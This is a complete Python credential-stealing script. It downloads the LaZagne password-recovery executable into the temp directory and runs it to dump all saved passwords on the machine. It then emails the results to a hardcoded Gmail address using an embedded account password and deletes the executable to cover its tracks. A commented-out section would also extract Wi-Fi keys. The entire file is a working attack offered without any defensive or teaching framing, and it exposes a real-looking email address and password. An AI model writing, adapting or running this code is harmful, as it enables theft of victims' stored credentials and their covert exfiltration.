import subprocess,smtplib,re,os,tempfile
import requests

def download(url:str):
    response = requests.get(url)
    filename = url.split('/')[-1]
    with open(filename,'wb') as file:
        file.write(response.content)

def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


temp = tempfile.gettempdir()
os.chdir(temp)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe")
result = subprocess.check_output('LaZagne.exe all',shell=True)
# for item in match:
#     command = f'netsh wlan show profile {item} key=clear'
#     executed = subprocess.check_output(command,shell=True)
#     result += executed

send_email("naghinjadali@gmail.com",'dkruuqpidwiaxjdh',result)
os.remove('LaZagne.exe')